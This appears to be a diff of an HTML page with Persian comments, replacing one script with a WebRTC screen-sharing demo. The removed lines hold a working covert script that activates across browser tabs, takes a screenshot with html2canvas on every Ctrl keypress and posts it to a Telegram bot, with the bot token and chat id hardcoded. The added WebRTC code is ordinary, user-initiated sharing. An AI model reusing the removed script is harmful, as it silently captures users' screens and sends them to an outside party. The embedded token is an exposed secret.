@@ -3,79 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Script with BroadcastChannel</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.3.2/html2canvas.min.js"></script>
+    <title>WebRTC Screen Sharing</title>
 </head>
 <body>
-    <h1>Global Script with BroadcastChannel</h1>
-    <p>Open this URL in one tab, and it will activate the script in all tabs.</p>
+    <h1>WebRTC Screen Sharing</h1>
+    <button id="startShare">Start Sharing</button>
+    <video id="remoteVideo" autoplay></video>
 
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.min.js"></script>
     <script>
-        const token = "7110052875:AAF8o8Rof0q4KFEuVZBLEHM1bgaWe7pZQss";
-        const chat_id = "-4583889773";
-        const telegramAPI = `https://api.telegram.org/bot${token}/sendPhoto`;
+        const startShare = document.getElementById('startShare');
+        const remoteVideo = document.getElementById('remoteVideo');
 
-        // BroadcastChannel برای ارتباط بین تب‌ها
-        const channel = new BroadcastChannel('global_script_channel');
+        // اتصال به سرور سیگنال‌دهی (آدرس سرور خود را وارد کنید)
+        const socket = io('https://your-signaling-server.com'); // آدرس سرور سیگنال‌دهی
+        let peerConnection;
+        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
 
-        // ارسال پیام به تمام تب‌ها برای اجرای کد
-        function activateGlobalScript() {
-            channel.postMessage('activate');
-        }
+        startShare.addEventListener('click', async () => {
+            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            remoteVideo.srcObject = stream;
 
-        // دریافت پیام و اجرای کد در تب‌های دیگر
-        channel.onmessage = (event) => {
-            if (event.data === 'activate') {
-                console.log('Script activated in this tab.');
-                startScript();
-            }
-        };
+            peerConnection = new RTCPeerConnection(config);
 
-        // عملکرد اصلی اسکریپت
-        function startScript() {
-            document.addEventListener('keydown', function (event) {
-                if (event.ctrlKey) {
-                    takeScreenshot();
+            // افزودن استریم به PeerConnection
+            stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));
+
+            // ارسال ICE Candidateها به سرور
+            peerConnection.onicecandidate = (event) => {
+                if (event.candidate) {
+                    socket.emit('ice-candidate', event.candidate);
                 }
-            });
+            };
 
-            // هر ۵ ثانیه یک پیام لاگ می‌شود
-            setInterval(() => {
-                console.log("Global script is running.");
-            }, 5000);
-        }
+            // ارسال Offer به سرور
+            const offer = await peerConnection.createOffer();
+            await peerConnection.setLocalDescription(offer);
+            socket.emit('offer', offer);
+        });
 
-        // ارسال اسکرین‌شات به تلگرام
-        function takeScreenshot() {
-            html2canvas(document.body, { useCORS: true }).then(function (canvas) {
-                const base64image = canvas.toDataURL("image/png");
-                sendToTelegram(base64image);
-            });
-        }
+        // دریافت Offer از سرور
+        socket.on('offer', async (offer) => {
+            peerConnection = new RTCPeerConnection(config);
 
-        // ارسال تصویر به تلگرام
-        function sendToTelegram(base64image) {
-            const byteString = atob(base64image.split(',')[1]);
-            const mimeString = base64image.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            const blob = new Blob([ab], { type: mimeString });
+            peerConnection.onicecandidate = (event) => {
+                if (event.candidate) {
+                    socket.emit('ice-candidate', event.candidate);
+                }
+            };
 
-            const formData = new FormData();
-            formData.append("chat_id", chat_id);
-            formData.append("photo", blob, "screenshot.png");
+            peerConnection.ontrack = (event) => {
+                remoteVideo.srcObject = event.streams[0];
+            };
 
-            fetch(telegramAPI, {
-                method: "POST",
-                body: formData
-            }).catch(error => console.error("Error:", error));
-        }
+            await peerConnection.setRemoteDescription(offer);
+            const answer = await peerConnection.createAnswer();
+            await peerConnection.setLocalDescription(answer);
+            socket.emit('answer', answer);
+        });
 
-        // فعال‌سازی کد در تب اصلی
-        activateGlobalScript();
+        // دریافت Answer از سرور
+        socket.on('answer', async (answer) => {
+            await peerConnection.setRemoteDescription(answer);
+        });
+
+        // دریافت ICE Candidateها از سرور
+        socket.on('ice-candidate', async (candidate) => {
+            await peerConnection.addIceCandidate(candidate);
+        });
     </script>
 </body>
 </html>
